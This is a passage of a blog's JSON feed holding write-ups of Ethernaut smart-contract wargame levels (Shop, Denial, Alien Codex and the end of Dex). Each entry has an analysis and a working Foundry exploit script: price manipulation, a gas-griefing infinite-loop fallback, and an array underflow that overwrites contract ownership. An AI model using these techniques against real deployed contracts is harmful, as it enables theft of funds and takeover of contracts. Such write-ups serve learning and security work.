class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When swapping, the <code class=\"language-plaintext highlighter-rouge\">from</code> token is transferred based on the input <code class=\"language-plaintext highlighter-rouge\">amount</code>, whereas the <code class=\"language-plaintext highlighter-rouge\">to</code> token is transferred based on the calculated <code class=\"language-plaintext highlighter-rouge\">swapAmount</code>.</p><p>Since <code class=\"language-plaintext highlighter-rouge\">swapAmount</code> is derived from <code class=\"language-plaintext highlighter-rouge\">getSwapPrice()</code> using division, precision loss may occur.</p>",
            "url": "https://0o3q.github.io/2026/01/06/dex",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","dex","precision_loss"],
            
            "date_published": "2026-01-06T00:00:00+09:00",
            "date_modified": "2026-01-06T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/04/shop",
            "title": "[Ethernaut] 21.Shop",
            "summary": null,
            "content_text": "AnalysisThe goal is “get the item from the shop for less than the price asked”.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBuyer {  function price() external view returns (uint256);}contract Shop {  uint256 public price = 100;  bool public isSold;  function buy() public {    IBuyer _buyer = IBuyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) {      isSold = true;      price = _buyer.price();    }  }}If the price from msg.sender is greater than or equal 100 and isSold is false, we can buy the item.However, the goal is to get the item for less than 100.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Shop.sol\";import \"forge-std/Script.sol\";contract Ex {    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);    function price() external view returns (uint256) {        if (shop_.isSold()) {            return 0;        } else {            return 100;        }    }    function ex() public {        shop_.buy();    }}contract ShopSol is Script {    Shop public shop_ = Shop(0xF2e18d8912005C118E1776537Fa4da1eA756B2c7);    function run() external {        vm.startBroadcast();        Ex ex = new Ex();        ex.ex();        console.log(\"item price: \", shop_.price());        console.log(\"isSold: \", shop_.isSold());        vm.stopBroadcast();    }}The Shop contract retrieves the price from msg.sender . Therefore, we create assist(Ex) contract that returns diffrent price based on whether isSold is true or false.The Shop contract should receive the price of 100 during the conditional check, and the price of 0 when the price  is updated.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “get the item from the shop for less than the price asked”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">IBuyer</span> <span class=\"p\">{</span>  <span class=\"k\">function</span> <span class=\"n\">price</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Shop</span> <span class=\"p\">{</span>  <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">price</span> <span class=\"o\">=</span> <span class=\"mi\">100</span><span class=\"p\">;</span>  <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">isSold</span><span class=\"p\">;</span>  <span class=\"k\">function</span> <span class=\"n\">buy</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>    <span class=\"n\">IBuyer</span> <span class=\"n\">_buyer</span> <span class=\"o\">=</span> <span class=\"n\">IBuyer</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">_buyer</span><span class=\"p\">.</span><span class=\"n\">price</span><span class=\"p\">()</span> <span class=\"o\">&gt;=</span> <span class=\"n\">price</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">isSold</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"n\">isSold</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>      <span class=\"n\">price</span> <span class=\"o\">=</span> <span class=\"n\">_buyer</span><span class=\"p\">.</span><span class=\"n\">price</span><span class=\"p\">();</span>    <span class=\"p\">}</span>  <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>If the <code class=\"language-plaintext highlighter-rouge\">price</code> from <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> is greater than or equal 100 and <code class=\"language-plaintext highlighter-rouge\">isSold</code> is false, we can buy the item.However, the goal is to get the item for less than 100.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Shop.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"n\">Shop</span> <span class=\"k\">public</span> <span class=\"n\">shop_</span> <span class=\"o\">=</span> <span class=\"n\">Shop</span><span class=\"p\">(</span><span class=\"mh\">0xF2e18d8912005C118E1776537Fa4da1eA756B2c7</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">price</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">shop_</span><span class=\"p\">.</span><span class=\"n\">isSold</span><span class=\"p\">())</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"k\">return</span> <span class=\"mi\">100</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">shop_</span><span class=\"p\">.</span><span class=\"n\">buy</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ShopSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Shop</span> <span class=\"k\">public</span> <span class=\"n\">shop_</span> <span class=\"o\">=</span> <span class=\"n\">Shop</span><span class=\"p\">(</span><span class=\"mh\">0xF2e18d8912005C118E1776537Fa4da1eA756B2c7</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"item price: \"</span><span class=\"p\">,</span> <span class=\"n\">shop_</span><span class=\"p\">.</span><span class=\"n\">price</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"isSold: \"</span><span class=\"p\">,</span> <span class=\"n\">shop_</span><span class=\"p\">.</span><span class=\"n\">isSold</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The Shop contract retrieves the <code class=\"language-plaintext highlighter-rouge\">price</code> from <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> . Therefore, we create assist(Ex) contract that returns diffrent <code class=\"language-plaintext highlighter-rouge\">price</code> based on whether <code class=\"language-plaintext highlighter-rouge\">isSold</code> is true or false.</p><p>The Shop contract should receive the <code class=\"language-plaintext highlighter-rouge\">price</code> of 100 during the conditional check, and the <code class=\"language-plaintext highlighter-rouge\">price</code> of 0 when the <code class=\"language-plaintext highlighter-rouge\">price</code>  is updated.</p>",
            "url": "https://0o3q.github.io/2026/01/04/shop",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","state","view"],
            
            "date_published": "2026-01-04T00:00:00+09:00",
            "date_modified": "2026-01-04T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/12/30/denial",
            "title": "[Ethernaut] 20.Denial",
            "summary": null,
            "content_text": "AnalysisThe goal is “deny the owner from withdrawing funds when they call withdraw()”.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial {    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint256 timeLastWithdrawn;    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public {        partner = _partner;    }    // withdraw 1% to recipient and 1% to owner    function withdraw() public {        uint256 amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call{value: amountToSend}(\"\");        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] += amountToSend;    }    // allow deposit of funds    receive() external payable {}    // convenience function    function contractBalance() public view returns (uint256) {        return address(this).balance;    }}The withdraw() function performs a call() to the partner and a transfer() to the owner; the partner address can be updated via the setWithdrawPartner() function.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Denial.sol\";import \"forge-std/Script.sol\";contract Ex {    fallback() external payable {        while (true) {}    }}contract DenialSol is Script {    Denial public den_ = Denial(payable(0x5c7A580EEE3627a66e3C4df5875a27401A47dCB6));    function run() external {        vm.startBroadcast();        Ex ex = new Ex();        den_.setWithdrawPartner(address(ex));        vm.stopBroadcast();    }}The Ex contract enters an infinite loop when called.Setting the partner to this contract can prevent the owner from withdrawing funds.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “deny the owner from withdrawing funds when they call withdraw()”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Denial</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">partner</span><span class=\"p\">;</span> <span class=\"c1\">// withdrawal partner - pay the gas, split the withdraw</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"k\">constant</span> <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mh\">0xA9E</span><span class=\"p\">);</span>    <span class=\"kt\">uint256</span> <span class=\"n\">timeLastWithdrawn</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">withdrawPartnerBalances</span><span class=\"p\">;</span> <span class=\"c1\">// keep track of partners balances</span>    <span class=\"k\">function</span> <span class=\"n\">setWithdrawPartner</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_partner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">partner</span> <span class=\"o\">=</span> <span class=\"n\">_partner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// withdraw 1% to recipient and 1% to owner</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">amountToSend</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span> <span class=\"o\">/</span> <span class=\"mi\">100</span><span class=\"p\">;</span>        <span class=\"c1\">// perform a call without checking return</span>        <span class=\"c1\">// The recipient can revert, the owner will still get their share</span>        <span class=\"n\">partner</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">amountToSend</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">amountToSend</span><span class=\"p\">);</span>        <span class=\"c1\">// keep track of last withdrawal time</span>        <span class=\"n\">timeLastWithdrawn</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span><span class=\"p\">;</span>        <span class=\"n\">withdrawPartnerBalances</span><span class=\"p\">[</span><span class=\"n\">partner</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">amountToSend</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// allow deposit of funds</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{}</span>    <span class=\"c1\">// convenience function</span>    <span class=\"k\">function</span> <span class=\"n\">contractBalance</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function performs a <code class=\"language-plaintext highlighter-rouge\">call()</code> to the partner and a <code class=\"language-plaintext highlighter-rouge\">transfer()</code> to the owner; the partner address can be updated via the <code class=\"language-plaintext highlighter-rouge\">setWithdrawPartner()</code> function.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Denial.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"nb\">true</span><span class=\"p\">)</span> <span class=\"p\">{}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">DenialSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Denial</span> <span class=\"k\">public</span> <span class=\"n\">den_</span> <span class=\"o\">=</span> <span class=\"n\">Denial</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x5c7A580EEE3627a66e3C4df5875a27401A47dCB6</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">den_</span><span class=\"p\">.</span><span class=\"n\">setWithdrawPartner</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The Ex contract enters an infinite loop when called.Setting the <code class=\"language-plaintext highlighter-rouge\">partner</code> to this contract can prevent the <code class=\"language-plaintext highlighter-rouge\">owner</code> from withdrawing funds.</p>",
            "url": "https://0o3q.github.io/2025/12/30/denial",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","gas","greifing"],
            
            "date_published": "2025-12-30T00:00:00+09:00",
            "date_modified": "2025-12-30T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/06/02/aliencodex",
            "title": "[Ethernaut] 19.Alien Codex",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import \"../helpers/Ownable-05.sol\";contract AlienCodex is Ownable {    bool public contact;    bytes32[] public codex;    modifier contacted() {        assert(contact);        _;    }    function makeContact() public {        contact = true;    }    function record(bytes32 _content) public contacted {        codex.push(_content);    }    function retract() public contacted {        codex.length--;    }    function revise(uint256 i, bytes32 _content) public contacted {        codex[i] = _content;    }}When first analyzing the AlienCodex contract, the record(), retract(), and revise() functions are wrapped by the contacted() modifier.Therefore, we must call the makeContact() function first to set the contact variable to true.pragma solidity ^0.5.0;/** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */contract Ownable {    address private _owner;    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    /**     * @dev Initializes the contract setting the deployer as the initial owner.     */    constructor() internal {        _owner = msg.sender;    }    /**     * @dev Returns the address of the current owner.     */    function owner() public view returns (address) {        return _owner;    }    /**     * @dev Throws if called by any account other than the owner.     */    modifier onlyOwner() {        require(isOwner(), \"Ownable: caller is not the owner\");        _;    }    /**     * @dev Returns true if the caller is the current owner.     */    function isOwner() public view returns (bool) {        return msg.sender == _owner;    }    /**     * @dev Leaves the contract without owner. It will not be possible to call     * `onlyOwner` functions anymore. Can only be called by the current owner.     *     * &gt; Note: Renouncing ownership will leave the contract without an owner,     * thereby removing any functionality that is only available to the owner.     */    function renounceOwnership() public onlyOwner {        emit OwnershipTransferred(_owner, address(0));        _owner = address(0);    }    /**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     * Can only be called by the current owner.     */    function transferOwnership(address newOwner) public onlyOwner {        _transferOwnership(newOwner);    }    /**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     */    function _transferOwnership(address newOwner) internal {        require(newOwner != address(0), \"Ownable: new owner is the zero address\");        emit OwnershipTransferred(_owner, newOwner);        _owner = newOwner;    }}Next, this contract is an Ownable contract that the AlienCodex contract inherits from. We need to overwrite the _owner variable in this contract.According to the Solidity documentation, we find that the _owner variable in the Ownable contract is stored at a lower storage slot than the contact and codex variables in the AlienCodex contract.The _owner and contact variables are stored together in slot 0 because the combined size of these two variables does not exceed 32 bytes, and the codex variable is stored separately in slot 1.To understand how the dynamic bytes array codex stores its data, we can refer to the Solidity documentation:  💡 bytes and string are encoded identically. In general, the encoding is similar to bytes1[], in the sense that there is a slot for the array itself and a data area that is computed using a keccak256 hash of that slot’s position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.  In particular: if the data is at most 31 bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value length * 2. For byte arrays that store data which is 32 or more bytes long, the main slot p stores length * 2 + 1 and the data is stored as usual in keccak256(p). This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).When we call the retract() function, the codex array’s length underflows from 0 to 2^256 - 1.After this underflow, we can overwrite any storage slot by using the revise() function.When the i argument is provided to revise(), the function computes keccak256(abi.encode(0x1)) + i.If we set this equal to 0, we can overwrite the _owner variable in slot 0.  💡 Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot 0Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.2;import \"forge-std/Script.sol\";interface AlienCodex {    function owner() external view returns (address);    function contact() external returns (bool);    function makeContact() external;    function record(bytes32 _content) external;    function retract() external;    function revise(uint256 i, bytes32 _content) external;}contract AlienCodexSol is Script{    AlienCodex public ac_ = AlienCodex(0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7);    function run() external {        vm.startBroadcast();                console.log(\"Before Owner: \", ac_.owner());        ac_.makeContact();        ac_.retract();        ac_.revise(~(uint256(keccak256(abi.encode(0x1)))) + 1, bytes32(uint256(uint160(vm.envAddress(\"MY_ADDRESS\")))));        console.log(\"After Owner: \", ac_.owner());        vm.stopBroadcast();    }}~uint256(keccak256(abi.encode(0x1))) + 1 represents the two’s complement of keccak256(abi.encode(0x1)).Therefore, when we use this value as the i argument in the revise() function, adding keccak256(abi.encode(0x1)) and ~uint256(keccak256(abi.encode(0x1))) + 1 results in 0.This allows us to attach the _owner variable in storage slot 0.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.5</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../helpers/Ownable-05.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">AlienCodex</span> <span class=\"k\">is</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">contact</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span><span class=\"p\">[]</span> <span class=\"k\">public</span> <span class=\"n\">codex</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">contacted</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">assert</span><span class=\"p\">(</span><span class=\"n\">contact</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">makeContact</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">contact</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">record</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">.</span><span class=\"n\">push</span><span class=\"p\">(</span><span class=\"n\">_content</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">retract</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"o\">--</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contacted</span> <span class=\"p\">{</span>        <span class=\"n\">codex</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_content</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When first analyzing the AlienCodex contract, the <code class=\"language-plaintext highlighter-rouge\">record()</code>, <code class=\"language-plaintext highlighter-rouge\">retract()</code>, and <code class=\"language-plaintext highlighter-rouge\">revise()</code> functions are <strong>wrapped by</strong> the <code class=\"language-plaintext highlighter-rouge\">contacted()</code> modifier.</p><p>Therefore, we must call the <code class=\"language-plaintext highlighter-rouge\">makeContact()</code> function first to set the <code class=\"language-plaintext highlighter-rouge\">contact</code> variable to <code class=\"language-plaintext highlighter-rouge\">true</code>.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.5</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"cm\">/** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */</span><span class=\"k\">contract</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">private</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"k\">event</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">indexed</span> <span class=\"n\">previousOwner</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"k\">indexed</span> <span class=\"n\">newOwner</span><span class=\"p\">);</span>    <span class=\"cm\">/**     * @dev Initializes the contract setting the deployer as the initial owner.     */</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Returns the address of the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">owner</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Throws if called by any account other than the owner.     */</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">isOwner</span><span class=\"p\">(),</span> <span class=\"s\">\"Ownable: caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Returns true if the caller is the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">isOwner</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Leaves the contract without owner. It will not be possible to call     * `onlyOwner` functions anymore. Can only be called by the current owner.     *     * &gt; Note: Renouncing ownership will leave the contract without an owner,     * thereby removing any functionality that is only available to the owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">renounceOwnership</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> 